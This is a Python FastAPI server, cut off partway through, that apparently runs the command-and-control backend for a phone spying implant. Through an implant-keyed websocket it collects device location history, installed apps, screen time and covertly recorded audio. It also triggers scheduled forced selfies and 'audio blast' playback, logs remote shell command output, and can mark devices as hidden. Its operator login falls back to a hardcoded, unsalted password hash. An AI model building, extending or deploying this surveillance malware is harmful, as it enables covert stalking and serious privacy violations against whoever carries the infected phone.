import sqlite3
import time
import secrets
import hashlib
import os
import math
import shutil
import threading
from datetime import datetime, timedelta
from typing import Optional, Generator
from contextlib import asynccontextmanager, suppress
from fastapi import FastAPI, Form, Request, Depends, HTTPException, status, UploadFile, File, Body, Header
from fastapi.staticfiles import StaticFiles
from fastapi.responses import JSONResponse, FileResponse, RedirectResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi import WebSocket, WebSocketDisconnect
import json
import asyncio
import re

SESSION_COOKIE_NAME = "session_token"
SESSION_DURATION = 60 * 60 * 8  # 8 hours
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_FILE = os.path.join(BASE_DIR, "telemetry.db")
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "admin")
# Default fallback placeholder for deployment initialization
ADMIN_PASSWORD_HASH = str(os.getenv("ADMIN_HASH") or "03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4")
IMPLANT_KEY = os.getenv("IMPLANT_KEY", "DeltaForce2027")
PROTECTED_MEDIA_ROOT = os.path.join(BASE_DIR, "protected_media")
AUDIO_DIR = os.path.join(PROTECTED_MEDIA_ROOT, "audio")
SELFIE_DIR = os.path.join(PROTECTED_MEDIA_ROOT, "selfies")
AUDIO_BLAST_DIR = os.path.join(BASE_DIR, "audio_blast")
os.makedirs(AUDIO_BLAST_DIR, exist_ok=True)

session_store: dict[str, float] = {}

def validate_device_id(device_id: str) -> bool:
    """Validate device ID format (alphanumeric, underscore, dash allowed)"""
    if not device_id or not isinstance(device_id, str):
        return False
    return len(device_id) <= 256 and re.match(r'^[a-zA-Z0-9_\-]+$', device_id) is not None

def validate_coordinates(lat: float, lon: float) -> bool:
    """Validate GPS coordinates are within valid ranges"""
    try:
        lat_f = float(lat)
        lon_f = float(lon)
        return -90 <= lat_f <= 90 and -180 <= lon_f <= 180
    except (ValueError, TypeError):
        return False

class ConnectionManager:
    def __init__(self):
        self.active_connections: dict[str, WebSocket] = {}
        self.lock = asyncio.Lock()

    async def connect(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        async with self.lock:
            self.active_connections[client_id] = websocket

    async def disconnect(self, client_id: str):
        async with self.lock:
            if client_id in self.active_connections:
                del self.active_connections[client_id]

    async def send_task(self, client_id: str, task_dict: dict) -> bool:
        async with self.lock:
            websocket = self.active_connections.get(client_id)
        if websocket is not None:
            try:
                await websocket.send_text(json.dumps(task_dict))
                return True
            except Exception:
                await self.disconnect(client_id)
                return False
        return False

ws_manager = ConnectionManager()
pending_location_checks: dict[str, asyncio.Future] = {}


def safe_token() -> str:
    return secrets.token_urlsafe(32)


def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode('utf-8')).hexdigest()


def add_session(token: str) -> None:
    expires = time.time() + SESSION_DURATION
    session_store[token] = expires


def validate_session_token(token: str) -> bool:
    if not token:
        return False
    expires = session_store.get(token)
    if not expires or expires < time.time():
        session_store.pop(token, None)
        return False
    session_store[token] = time.time() + SESSION_DURATION
    return True


def sanitize_device_id(device_id: str) -> str:
    safe = "".join(c for c in device_id if c.isalnum() or c in ("-", "_")).strip()
    return safe or "unknown"


def create_db_connection() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_FILE, check_same_thread=False, timeout=30)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL;")
    conn.execute("PRAGMA synchronous=NORMAL;")
    conn.execute("PRAGMA temp_store=MEMORY;")
    conn.execute("PRAGMA cache_size=-10000;")   # ~40 MB page cache per connection
    conn.execute("PRAGMA mmap_size=134217728;")  # 128 MB memory-mapped I/O
    conn.execute("PRAGMA wal_autocheckpoint=1000;")  # checkpoint every 1000 pages, not 100
    return conn


# ── Per-device GPS cache (avoids SELECT on every WS frame) ─────────────────────
# Maps device_id -> (lat, lon, unix_time) of the last point written to history.
# Guards against GPS jitter: only store a new point if the device moved at least
# GPS_MIN_DISTANCE_M metres AND at least GPS_MIN_INTERVAL_S seconds have passed.
GPS_MIN_DISTANCE_M: float = 25.0    # metres — absorbs typical urban GPS noise (±5–20 m)
GPS_MIN_INTERVAL_S: float = 60.0    # seconds — regardless of distance, never write faster
_gps_last_point: dict[str, tuple[float, float, float]] = {}


def should_record_gps(device_id: str, lat: float, lon: float, now_unix: float) -> bool:
    """
    Returns True only when the device has genuinely moved beyond GPS noise AND
    enough time has passed since the last recorded point.

    Thresholds:
      - GPS_MIN_DISTANCE_M (25 m): absorbs typical consumer-grade GPS jitter.
        A device sitting still may report positions scattered within a 10–20 m
        radius; we require >25 m displacement so those never get stored.
      - GPS_MIN_INTERVAL_S (60 s): even if the device moves >25 m (fast GPS
        update burst, vehicle, etc.) we still throttle writes to at most one
        per minute to prevent flooding during long drives.
    """
    last = _gps_last_point.get(device_id)
    if last is None:
        return True  # first point for this device — always record

    last_lat, last_lon, last_time = last

    # Time gate first (cheap)
    if now_unix - last_time < GPS_MIN_INTERVAL_S:
        return False

    # Haversine distance (only computed when time gate passes)
    lat1, lon1 = math.radians(last_lat), math.radians(last_lon)
    lat2, lon2 = math.radians(lat),      math.radians(lon)
    dlat = lat2 - lat1
    dlon = lon2 - lon1
    a = math.sin(dlat / 2) ** 2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon / 2) ** 2
    distance_m = 6_371_000.0 * 2.0 * math.asin(math.sqrt(a))
    return distance_m > GPS_MIN_DISTANCE_M


def update_gps_cache(device_id: str, lat: float, lon: float, unix_time: float) -> None:
    """Update the in-memory cache after a successful history INSERT."""
    _gps_last_point[device_id] = (lat, lon, unix_time)


def get_db() -> Generator[sqlite3.Connection, None, None]:
    conn = create_db_connection()
    try:
        yield conn
    finally:
        conn.close()


def add_column_if_not_exists(conn: sqlite3.Connection, table: str, column_definition: str):
    # This was a SQL injection vector. Removing and hardcoding table schemas.
    pass




def haversine(lat1: float, lon1: float, lat2: float, lon2: float) -> float:
    R = 6371000.0  # Radius of Earth in meters
    dLat = math.radians(lat2 - lat1)
    dLon = math.radians(lon2 - lon1)
    a = math.sin(dLat / 2)**2 + math.cos(math.radians(lat1)) * math.cos(math.radians(lat2)) * math.sin(dLon / 2)**2
    c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
    return R * c

def init_db():
    """Initializes the database schema on system startup."""
    conn = create_db_connection()
    c = conn.cursor()
    # PRAGMAs already applied by create_db_connection; no need to repeat them.
    c.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            level INTEGER,
            lat REAL,
            lon REAL,
            timestamp TEXT,
            unix_time REAL,
            ping_interval INTEGER DEFAULT 5,
            record_audio INTEGER DEFAULT 0,
            record_duration INTEGER DEFAULT 30,
            notif_state INTEGER DEFAULT 0,
            notif_text TEXT DEFAULT '',
            blocked_apps TEXT DEFAULT '',
            location_tracking INTEGER DEFAULT 1,
            installed_apps TEXT DEFAULT '',
            screen_time_minutes INTEGER DEFAULT 0,
            charging INTEGER DEFAULT 0,
            last_shell_command TEXT DEFAULT '',
            last_shell_output TEXT DEFAULT '',
            last_shell_status INTEGER DEFAULT 0,
            last_shell_at REAL DEFAULT 0
        )
    """)
    # NOTE: Indices for history and battery_history are created below, after
    # all tables are defined.  The two early index statements were removed to
    # prevent "no such table" errors on a fresh database.
    c.execute("""
        CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            level INTEGER,
            lat REAL,
            lon REAL,
            timestamp TEXT,
            unix_time REAL
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS daily_screen_time (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            date TEXT,
            minutes INTEGER DEFAULT 0,
            updated_at REAL,
            UNIQUE(device_id, date)
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS battery_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            level INTEGER,
            timestamp TEXT,
            unix_time REAL,
            gap_seconds INTEGER DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS device_errors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            source TEXT,
            message TEXT,
            timestamp TEXT,
            unix_time REAL
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS selfies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            filename TEXT,
            timestamp TEXT,
            unix_time REAL,
            battery INTEGER DEFAULT 0,
            lat REAL DEFAULT 0,
            lon REAL DEFAULT 0,
            review_status TEXT DEFAULT 'pending',
            reviewed_at TEXT DEFAULT NULL
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS selfie_skips (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            skip_date TEXT,
            timestamp TEXT,
            unix_time REAL,
            UNIQUE(device_id, skip_date)
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS selfie_schedule (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE,
            next_run_at TEXT,
            enabled INTEGER DEFAULT 1,
            dev_mode INTEGER DEFAULT 1,
            created_at REAL,
            updated_at REAL
        )
    """)

    try:
        c.execute("ALTER TABLE devices ADD COLUMN play_audio INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass
    
    try:
        c.execute("ALTER TABLE devices ADD COLUMN reboot_cmd INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass
        
    try:
        c.execute("ALTER TABLE devices ADD COLUMN shutdown_cmd INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass

    try:
        c.execute("ALTER TABLE devices ADD COLUMN screen_time_minutes INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass

    try:
        c.execute("ALTER TABLE devices ADD COLUMN charging INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass

    try:
        c.execute("ALTER TABLE devices ADD COLUMN hidden INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass

    try:
        c.execute("ALTER TABLE selfies ADD COLUMN review_status TEXT DEFAULT 'pending'")
    except sqlite3.OperationalError:
        pass

    try:
        c.execute("ALTER TABLE selfies ADD COLUMN reviewed_at TEXT DEFAULT NULL")
    except sqlite3.OperationalError:
        pass
    
    # Canonical index set — composite (device_id, unix_time DESC) covers both
    # ORDER BY unix_time DESC and WHERE device_id = ? queries, making the
    # separate single-column indices on device_id redundant for those tables.
    c.execute("CREATE INDEX IF NOT EXISTS idx_history_device_unix      ON history(device_id, unix_time DESC)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_battery_device_unix      ON battery_history(device_id, unix_time DESC)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_errors_device_unix       ON device_errors(device_id, unix_time DESC)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_selfies_device_unix      ON selfies(device_id, unix_time DESC)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_screen_time_device_date  ON daily_screen_time(device_id, date)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_selfie_schedule_device   ON selfie_schedule(device_id)")
    conn.commit()
    conn.close()

# Ensure the database schema exists even if FastAPI startup lifespan isn't executed.
init_db()

LAST_CLEANUP = 0
CLEANUP_INTERVAL = 86400  # Run cleanup at most once per day
REQUEST_COUNTER = 0

def run_auto_cleanup(db: sqlite3.Connection):
    """Batched cleanup to avoid long exclusive-lock spikes that block WS writes.

    Deletes are issued in chunks of 500 rows so the WAL can be flushed between
    batches.  This keeps write-lock windows short even when millions of rows
    have accumulated.
    """
    global LAST_CLEANUP
    now = time.time()
    if now - LAST_CLEANUP < CLEANUP_INTERVAL:
        return
    LAST_CLEANUP = now
    seven_days_ago = now - (7 * 86400)

    c = db.cursor()
    tables = [
        ("history",        "unix_time"),
        ("battery_history", "unix_time"),
        ("device_errors",  "unix_time"),
    ]
    for table, col in tables:
        # Delete in small batches to avoid locking the DB for hundreds of ms
        while True:
            c.execute(
                f"DELETE FROM {table} WHERE rowid IN "
                f"(SELECT rowid FROM {table} WHERE {col} < ? LIMIT 500)",
                (seven_days_ago,)
            )
            deleted = c.rowcount
            db.commit()
            if deleted < 500:
                break  # no more rows to delete

    # Run OPTIMIZE to refresh query-planner statistics after bulk deletes
    try:
        db.execute("PRAGMA optimize;")
    except sqlite3.DatabaseError:
        pass

    # Checkpoint the WAL so the file doesn't grow unboundedly
    db.execute("PRAGMA wal_checkpoint(PASSIVE);")
    try:
        db.execute("PRAGMA incremental_vacuum(200);")
    except sqlite3.DatabaseError:
        pass

    # Delete unflagged audio older than 7 days
    if os.path.exists(AUDIO_DIR):
        for f in os.listdir(AUDIO_DIR):
            if f.endswith(".wav") and "_FLAG" not in f:
                try:
                    parts = f.split('_')
                    ts = int(parts[-1].split('.')[0])
                    if ts < seven_days_ago:
                        os.remove(os.path.join(AUDIO_DIR, f))
                except Exception:
                    pass

scheduler_task: Optional[asyncio.Task] = None


def choose_default_selfie_datetime() -> datetime:
    now = datetime.now()
    if now.hour < 10:
        return now.replace(hour=10, minute=30, second=0, microsecond=0)
    if now.hour < 14:
        return now.replace(hour=14, minute=30, second=0, microsecond=0)
    if now.hour < 18:
        return now.replace(hour=18, minute=30, second=0, microsecond=0)
    return (now + timedelta(days=1)).replace(hour=10, minute=30, second=0, microsecond=0)


def parse_datetime_string(value: str) -> Optional[datetime]:
    if not value:
        return None
    try:
        return datetime.strptime(value, "%Y-%m-%d %H:%M")
    except Exception:
        return None


def format_datetime_string(value: datetime) -> str:
    return value.strftime("%Y-%m-%d %H:%M")


def get_next_run_at_for_time_string(time_str: str) -> str:
    now = datetime.now()
    try:
        parsed = datetime.strptime(time_str, "%H:%M")
        next_run = now.replace(hour=parsed.hour, minute=parsed.minute, second=0, microsecond=0)
    except Exception:
        next_run = choose_default_selfie_datetime()
    if next_run <= now:
        next_run += timedelta(days=1)
    return format_datetime_string(next_run)


def to_int(value, default=0) -> int:
    try:
        return int(value)
    except Exception:
        if isinstance(value, str):
            return 1 if value.lower() in ("true", "yes", "on") else 0
        return default


def ensure_selfie_schedule(device_id: str, db: sqlite3.Connection):
    c = db.cursor()
    c.execute("SELECT device_id, next_run_at, enabled, dev_mode FROM selfie_schedule WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    if row:
        return row
    next_run = choose_default_selfie_datetime()
    now_unix = time.time()
    c.execute("INSERT INTO selfie_schedule (device_id, next_run_at, enabled, dev_mode, created_at, updated_at) VALUES (?, ?, 1, 1, ?, ?)",
              (device_id, format_datetime_string(next_run), now_unix, now_unix))
    db.commit()
    c.execute("SELECT device_id, next_run_at, enabled, dev_mode FROM selfie_schedule WHERE device_id = ?", (device_id,))
    return c.fetchone()


def update_selfie_schedule_next_day(device_id: str, db: sqlite3.Connection):
    c = db.cursor()
    c.execute("SELECT next_run_at FROM selfie_schedule WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    if not row or not row["next_run_at"]:
        return
    current_run = parse_datetime_string(row["next_run_at"])
    if not current_run:
        return
    next_run = current_run + timedelta(days=1)
    c.execute("UPDATE selfie_schedule SET next_run_at = ?, updated_at = ? WHERE device_id = ?",
              (format_datetime_string(next_run), time.time(), device_id))
    db.commit()


def is_skip_today(device_id: str, today: str, c: sqlite3.Connection.cursor) -> bool:
    c.execute("SELECT 1 FROM selfie_skips WHERE device_id = ? AND skip_date = ? LIMIT 1", (device_id, today))
    return c.fetchone() is not None


async def selfie_scheduler():
    while True:
        try:
            db = create_db_connection()
            c = db.cursor()
            c.execute("SELECT device_id, next_run_at, enabled, dev_mode FROM selfie_schedule")
            rows = c.fetchall()
            now = datetime.now()
            today = now.strftime("%Y-%m-%d")
            for row in rows:
                if row["enabled"] != 1 or not row["next_run_at"]:
                    continue
                next_run = parse_datetime_string(row["next_run_at"])
                if not next_run or next_run > now:
                    continue
                if is_skip_today(row["device_id"], today, c):
                    update_selfie_schedule_next_day(row["device_id"], db)
                    continue
                if row["dev_mode"] == 1:
                    update_selfie_schedule_next_day(row["device_id"], db)
                    continue
                if row["device_id"] in ws_manager.active_connections:
                    await ws_manager.send_task(row["device_id"], {"task": "force_selfie"})
                    update_selfie_schedule_next_day(row["device_id"], db)
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"[scheduler] selfie scheduler error: {e}", flush=True)
        finally:
            try:
                db.close()
            except Exception:
                pass
        await asyncio.sleep(30)

async def auto_cleanup_task():
    """Runs database auto-cleanup asynchronously to prevent DoS lockups on battery reports."""
    while True:
        await asyncio.sleep(600)  # Run every 10 minutes
        try:
            db = create_db_connection()
            run_auto_cleanup(db)
        except Exception as e:
            print(f"[cleanup] task error: {e}", flush=True)
        finally:
            try:
                db.close()
            except Exception:
                pass


@asynccontextmanager
async def lifespan(app: FastAPI):
    # Setup infrastructure folders and verify DB structure on start
    os.makedirs("static", exist_ok=True)
    os.makedirs(AUDIO_DIR, exist_ok=True)
    os.makedirs(SELFIE_DIR, exist_ok=True)
    os.makedirs("templates", exist_ok=True)
    init_db()

    # Seed the in-memory GPS cache from the last recorded point per device so
    # that a server restart doesn't re-admit a "first point" for every device.
    try:
        _seed_conn = create_db_connection()
        _c = _seed_conn.cursor()
        _c.execute(
            "SELECT device_id, lat, lon, unix_time "
            "FROM history "
            "GROUP BY device_id "
            "HAVING unix_time = MAX(unix_time)"
        )
        for _row in _c.fetchall():
            _gps_last_point[_row["device_id"]] = (
                _row["lat"], _row["lon"], _row["unix_time"]
            )
        _seed_conn.close()
        print(f"[startup] GPS cache seeded for {len(_gps_last_point)} device(s)", flush=True)
    except Exception as _e:
        print(f"[startup] GPS cache seed failed (non-fatal): {_e}", flush=True)

    global scheduler_task, cleanup_task
    scheduler_task = asyncio.create_task(selfie_scheduler())
    cleanup_task = asyncio.create_task(auto_cleanup_task())
    try:
        yield
    finally:
        if scheduler_task:
            scheduler_task.cancel()
            with suppress(asyncio.CancelledError):
                await scheduler_task
        if cleanup_task:
            cleanup_task.cancel()
            with suppress(asyncio.CancelledError):
                await cleanup_task

app = FastAPI(lifespan=lifespan)

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    client_id = f"client_{id(websocket)}"
    db = create_db_connection()
    pending_upload: dict | None = None  # Holds metadata for a pending binary file upload
    try:
        while True:
            msg = await websocket.receive()
            
            # Handle binary frames (file upload data)
            if msg.get("type") == "websocket.receive" and "bytes" in msg and msg["bytes"] is not None:
                if pending_upload is not None:
                    try:
                        upload_device = pending_upload.get("device_id", client_id)
                        safe_dev = sanitize_device_id(upload_device)
                        filepath = pending_upload.get("filepath", "unknown")
                        ext = os.path.splitext(filepath)[1] or ".m4a"
                        filename = f"{safe_dev}_{int(time.time())}{ext}"
                        dest = os.path.join(AUDIO_DIR, filename)
                        with open(dest, "wb") as f:
                            f.write(msg["bytes"])
                        print(f"[upload] Saved {len(msg['bytes'])}B audio from {upload_device} → {dest}", flush=True)
                        # Reset record_audio flag so dashboard knows it's done
                        c = db.cursor()
                        c.execute("UPDATE devices SET record_audio = 0 WHERE device_id = ?", (upload_device,))
                        db.commit()
                    except Exception as e:
                        print(f"[upload] Failed to save binary upload: {e}", flush=True)
                    finally:
                        pending_upload = None
                else:
                    print(f"[ws] Unexpected binary frame ({len(msg['bytes'])}B) with no pending upload metadata", flush=True)
                continue
            
            # Handle text frames (JSON messages)
            raw_data = msg.get("text")
            if raw_data is None:
                continue
                
            try:
                data = json.loads(raw_data)
                
                if data.get("implant_key") != IMPLANT_KEY:
                    continue

                # Handle file upload metadata (next frame will be binary)
                if "upload_type" in data:
                    pending_upload = {"device_id": client_id, **data}
                    print(f"[upload] Received upload metadata from {client_id}: type={data.get('upload_type')}, path={data.get('filepath')}", flush=True)
                    continue

                if "command_result" in data:
                    now_unix = time.time()
                    c = db.cursor()
                    result_text = data.get("command_result", "") or "[No output]"
                    c.execute('''UPDATE devices SET last_shell_output = ?, last_shell_status = 1, last_shell_at = ? WHERE device_id = ?''',
                              (result_text, now_unix, client_id))
                    db.commit()
                    continue

                if "device_id" in data:
                    client_id = data["device_id"]
                    is_new_connection = client_id not in ws_manager.active_connections
                    ws_manager.active_connections[client_id] = websocket
                    
                    now_unix = time.time()
                    time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
                    c = db.cursor()
                    
                    c.execute("SELECT level, lat, lon, installed_apps, location_tracking, screen_time_minutes, charging, ping_interval, hidden FROM devices WHERE device_id=?", (client_id,))
                    existing = c.fetchone()
                    exists = existing is not None
                    
                    if is_new_connection and exists:
                        print(f"Sending initial sync to {client_id}: interval={existing['ping_interval']}, location={existing['location_tracking']}", flush=True)
                        # Sync server state down to the device
                        await ws_manager.send_task(client_id, {"task": "set_interval", "interval": existing["ping_interval"]})
                        await ws_manager.send_task(client_id, {"task": "set_location", "track": existing["location_tracking"]})
                        
                        # Sync pending audio blast command if one was queued while offline
                        c2 = db.cursor()
                        c2.execute("SELECT play_audio, audio_loops FROM devices WHERE device_id = ?", (client_id,))
                        audio_row = c2.fetchone()
                        if audio_row and audio_row["play_audio"] and audio_row["play_audio"] != 0:
                            audio_loops = audio_row["audio_loops"] if audio_row["audio_loops"] else 0
                            payload = {"task": "audio_blast", "play": str(audio_row["play_audio"]), "loops": str(audio_loops)}
                            print(f"[audio] Syncing queued audio blast to reconnected device {client_id}: {payload}", flush=True)
                            await ws_manager.send_task(client_id, payload)
                    
                    if "error_source" in data and "error_msg" in data:
                        c.execute('''INSERT INTO device_errors (device_id, source, message, timestamp, unix_time)
                                     VALUES (?, ?, ?, ?, ?)''',
                                  (client_id, data["error_source"], data["error_msg"], time_str, now_unix))
                        db.commit()
                        continue
                    
                    apps = data.get("installed_apps", existing["installed_apps"] if existing else "")
                    
                    screen_time_minutes = None
                    if "screen_time_minutes" in data:
                        try:
                            screen_time_minutes = int(data.get("screen_time_minutes", 0))
                        except Exception:
                            screen_time_minutes = 0
                    elif "screen_time_hours" in data or "screen_time_mins" in data:
                        try:
                            hours = int(data.get("screen_time_hours", 0))
                            mins = int(data.get("screen_time_minutes", data.get("screen_time_mins", 0)))
                            screen_time_minutes = max(0, hours * 60 + mins)
                        except Exception:
                            screen_time_minutes = 0
                    elif isinstance(data.get("screen_time"), str):
                        parts = data.get("screen_time", "").split(":")
                        try:
                            if len(parts) == 2:
                                screen_time_minutes = int(parts[0]) * 60 + int(parts[1])
                            elif len(parts) == 1:
                                screen_time_minutes = int(parts[0])
                        except Exception:
                            screen_time_minutes = 0

                    battery_val = data.get("battery", existing["level"] if existing else 0)
                    lat_val = data.get("lat", existing["lat"] if existing else 0.0)
                    lon_val = data.get("lon", existing["lon"] if existing else 0.0)
                    loc_state_val = data.get("loc_state", existing["location_tracking"] if existing else 1)
                    charging_val = data.get("charging", existing["charging"] if existing else 0)
                    if isinstance(charging_val, str) and charging_val.isdigit():
                        charging_val = int(charging_val)
                    current_screen_time = screen_time_minutes if screen_time_minutes is not None else (existing["screen_time_minutes"] if existing else 0)

                    if "loc_state" in data:
                        pending_future = pending_location_checks.get(client_id)
                        if pending_future is not None and not pending_future.done():
                            pending_future.set_result(int(loc_state_val))

                    # Record battery history only when the battery level changes
                    if not existing or battery_val != existing["level"]:
                        c.execute("SELECT unix_time FROM battery_history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 1", (client_id,))
                        last_batt_row = c.fetchone()
                        gap_seconds = 0
                        if last_batt_row:
                            gap_seconds = int(now_unix - last_batt_row["unix_time"])
                        c.execute('''INSERT INTO battery_history (device_id, level, timestamp, unix_time, gap_seconds)
                                     VALUES (?, ?, ?, ?, ?)''',
                                  (client_id, battery_val, time_str, now_unix, gap_seconds))

                    if exists:
                        if "loc_state" in data:
                            c.execute('''UPDATE devices SET level=?, lat=?, lon=?, timestamp=?, unix_time=?, installed_apps=?, location_tracking=?, screen_time_minutes=?, charging=?
                                         WHERE device_id=?''', 
                                      (battery_val, lat_val, lon_val, time_str, now_unix, apps, loc_state_val, current_screen_time, charging_val, client_id))
                        else:
                            c.execute('''UPDATE devices SET level=?, lat=?, lon=?, timestamp=?, unix_time=?, installed_apps=?, screen_time_minutes=?, charging=?
                                         WHERE device_id=?''', 
                                      (battery_val, lat_val, lon_val, time_str, now_unix, apps, current_screen_time, charging_val, client_id))
                    else:
                        c.execute('''INSERT INTO devices (device_id, level, lat, lon, timestamp, unix_time, installed_apps, screen_time_minutes, charging)
                                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                                  (client_id, battery_val, lat_val, lon_val, time_str, now_unix, apps, current_screen_time, charging_val))

                    if screen_time_minutes is not None:
                        date_str = time.strftime('%Y-%m-%d', time.localtime())
                        c.execute('SELECT id FROM daily_screen_time WHERE device_id = ? AND date = ?', (client_id, date_str))
                        if c.fetchone():
                            c.execute('UPDATE daily_screen_time SET minutes = ?, updated_at = ? WHERE device_id = ? AND date = ?', (screen_time_minutes, now_unix, client_id, date_str))
                        else:
                            c.execute('INSERT INTO daily_screen_time (device_id, date, minutes, updated_at) VALUES (?, ?, ?, ?)', (client_id, date_str, screen_time_minutes, now_unix))
                    
                    if loc_state_val == 1 and "lat" in data and "lon" in data:
                        # GPS deduplication: reject points within GPS noise range OR
                        # received faster than the minimum storage interval.
                        # See should_record_gps() for threshold rationale.
                        try:
                            lat_val = float(lat_val)
                            lon_val = float(lon_val)
                            if -90 <= lat_val <= 90 and -180 <= lon_val <= 180:
                                if should_record_gps(client_id, lat_val, lon_val, now_unix):
                                    c.execute(
                                        "INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time) "
                                        "VALUES (?, ?, ?, ?, ?, ?)",
                                        (client_id, battery_val, lat_val, lon_val, time_str, now_unix)
                                    )
                                    update_gps_cache(client_id, lat_val, lon_val, now_unix)
                            else:
                                print(f"Invalid coordinates for {client_id}: lat={lat_val}, lon={lon_val}", flush=True)
                        except (ValueError, TypeError) as e:
                            print(f"Failed to record location for {client_id}: {e}", flush=True)

                    db.commit()
                    if is_new_connection:
                        ensure_selfie_schedule(client_id, db)
            except WebSocketDisconnect:
                await ws_manager.disconnect(client_id)
                break
            except Exception as e:
                import traceback
                print("Exception in websocket loop:", e)
                traceback.print_exc()
                await ws_manager.disconnect(client_id)
                break
    except Exception as e:
        import traceback
        print("Outer exception in websocket endpoint:", e)
        traceback.print_exc()
        await ws_manager.disconnect(client_id)
    finally:
        db.close()


app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False, # HARDENED: Browsers reject wildcard origins combined with true credentials
    allow_methods=["*"],
    allow_headers=["*"],
)

# Mount public static assets.
app.mount("/static", StaticFiles(directory=os.path.join(BASE_DIR, "static")), name="static")
app.mount("/audio_blast", StaticFiles(directory=AUDIO_BLAST_DIR), name="audio_blast")

@app.get("/media/audio/{filename}")
async def protected_audio(filename: str, request: Request):
    verify_session(request)
    safe_name = os.path.basename(filename)
    file_path = os.path.join(AUDIO_DIR, safe_name)
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    # Auto-detect MIME type based on extension
    mime = "audio/mp4" if safe_name.endswith(".m4a") else "audio/wav"
    return FileResponse(file_path, media_type=mime)

@app.get("/media/selfies/{filename}")
async def protected_selfie(filename: str, request: Request):
    verify_session(request)
    safe_name = os.path.basename(filename)
    file_path = os.path.join(SELFIE_DIR, safe_name)
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path, media_type="image/jpeg")


def verify_session(request: Request) -> bool:
    """Verifies access authorization based on secure session tokens."""
    token = request.cookies.get(SESSION_COOKIE_NAME)
    if not token or not validate_session_token(token):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Unauthorized")
    return True

@app.post("/api/login")
async def api_login(request: Request, username: str = Form(...), password: str = Form(...)):
    hashed_input = hash_password(password)
    if username == ADMIN_USERNAME and secrets.compare_digest(hashed_input, ADMIN_PASSWORD_HASH):
        session_token = safe_token()
        add_session(session_token)
        response = RedirectResponse(url="/", status_code=status.HTTP_303_SEE_OTHER)
        response.set_cookie(
            key=SESSION_COOKIE_NAME,
            value=session_token,
            httponly=True,
            samesite="strict",
            secure=request.url.scheme == "https",
        )
        return response
    return HTMLResponse("<p style='color:red; text-align:center; margin-top:50px;'>Authentication failure. Invalid Key Ring.</p>", status_code=401)

@app.get("/login", response_class=FileResponse)
async def serve_login():
    return FileResponse("templates/login.html", media_type="text/html")

@app.get("/favicon.ico", include_in_schema=False)
async def favicon():
    return JSONResponse(status_code=204, content="")

@app.get("/", response_class=FileResponse)
async def serve_index(request: Request):
    try:
        verify_session(request)
    except HTTPException:
        return RedirectResponse(url="/login")
    return FileResponse("templates/index.html", media_type="text/html")

@app.get("/history_view", response_class=FileResponse)
async def history_view(request: Request):
    try:
        verify_session(request)
    except HTTPException:
        return RedirectResponse(url="/login")
    return FileResponse("templates/history.html", media_type="text/html")

@app.get("/errors_view", response_class=FileResponse)
async def errors_view(request: Request):
    try:
        verify_session(request)
    except HTTPException:
        return RedirectResponse(url="/login")
    return FileResponse("templates/errors.html", media_type="text/html")

@app.get("/apps_view", response_class=FileResponse)
async def apps_view(request: Request):
    try:
        verify_session(request)
    except HTTPException:
        return RedirectResponse(url="/login")
    return FileResponse("templates/apps.html", media_type="text/html")

@app.get("/selfies_view", response_class=FileResponse)
async def selfies_view(request: Request):
    try:
        verify_session(request)
    except HTTPException:
        return RedirectResponse(url="/login")
    return FileResponse("templates/selfies.html", media_type="text/html")

@app.get("/updater_view", response_class=FileResponse)
async def updater_view(request: Request):
    try:
        verify_session(request)
    except HTTPException:
        return RedirectResponse(url="/login")
    return FileResponse("templates/updater.html", media_type="text/html")

@app.post("/battery_report")
async def receive_report(
    implant_key: str = Form(...),
    device_id: str = Form(...),
